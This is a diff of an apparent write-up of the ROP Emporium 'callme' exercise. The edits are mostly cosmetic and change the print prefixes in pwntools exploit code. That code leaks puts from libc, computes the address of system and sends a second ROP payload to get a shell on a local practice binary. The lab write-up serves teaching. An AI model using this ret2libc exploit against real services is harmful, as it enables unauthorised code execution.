@@ -75,7 +75,7 @@ payload1 += p64(PUTS_GOT)
 payload1 += p64(PUTS_PLT)
 ```
 
-Alright, so after calling `puts` through a gadget, we need to read back the information and parse it. Let's just blindly read back everything and print it for now, just to see what it's doing.
+Alright, so after calling `puts` with the proper parameter, we need to read back the information it spat out and parse it into something we can use. Let's just blindly read back everything and print it for now, just to see what it's doing.
 
 ```python
 conn = process()
@@ -149,7 +149,7 @@ Great. Now let's just throw out some code to unpack our bytes into an integer.
 conn.recvuntil(b"Thank you!\n")
 # bit of a hack but it worked
 puts_addr = u64(conn.recv(6) + b'\x00\x00')
-print("[*] received libc_puts address %s" % hex(puts_addr))
+print(">>> received libc_puts address %s" % hex(puts_addr))
 ```
 
 Running it, we get:
@@ -165,7 +165,7 @@ $ python shell.py
     PIE:      No PIE (0x400000)
     RUNPATH:  b'.'
 [+] Starting local process '/home/sammy/Projects/binexp/ropemporium/3-callme/callme': pid 39511
-[*] received libc_puts address 0x7ffff7a715a0
+>>> received libc_puts address 0x7ffff7a715a0
 [*] Stopped process '/home/sammy/Projects/binexp/ropemporium/3-callme/callme' (pid 39511)
 ```
 
@@ -272,22 +272,22 @@ conn = process()
 
 conn.recvuntil(b'> ')
 
-print("[*] sending payload 1")
+print(">>> sending payload 1")
 conn.send(payload1)
 
 conn.recvuntil(b"Thank you!\n")
 # bit of a hack but it worked
 puts_addr = u64(conn.recv(6) + b'\x00\x00')
-print("[*] received libc_puts address %s" % hex(puts_addr))
+print(">>> received libc_puts address %s" % hex(puts_addr))
 
 # calculate the address of system
 
 # from the leaked address of puts, use its offset to calculate the address of libc
 libc_leak = puts_addr - LIBC_PUTS
-print("[*] libc leaked address is %s" % hex(libc_leak))
+print(">>> libc leaked address is %s" % hex(libc_leak))
 # from there, add the offset of system to calculate its address
 libc_system_leak = libc_leak + LIBC_SYSTEM
-print("[*] system leaked address is %s" % hex(libc_system_leak))
+print(">>> system leaked address is %s" % hex(libc_system_leak))
 ```
 
 Running it, we get:
@@ -309,10 +309,10 @@ $ python shell.py
     NX:       NX enabled
     PIE:      PIE enabled
 [+] Starting local process '/home/sammy/Projects/binexp/ropemporium/3-callme/callme': pid 54924
-[*] sending payload 1
-[*] received libc_puts address 0x7ffff7a715a0
-[*] libc leaked address is 0x7ffff79f6000
-[*] system leaked address is 0x7ffff7a45230
+>>> sending payload 1
+>>> received libc_puts address 0x7ffff7a715a0
+>>> libc leaked address is 0x7ffff79f6000
+>>> system leaked address is 0x7ffff7a45230
 [*] Stopped process '/home/sammy/Projects/binexp/ropemporium/3-callme/callme' (pid 54924)
 ```
 
@@ -419,7 +419,7 @@ payload2 += p64(libc_system_leak)
 
 conn.recvuntil(b'> ')
 
-print("[*] sending payload 2")
+print(">>> sending payload 2")
 conn.send(payload2)
 
 # enter interactive
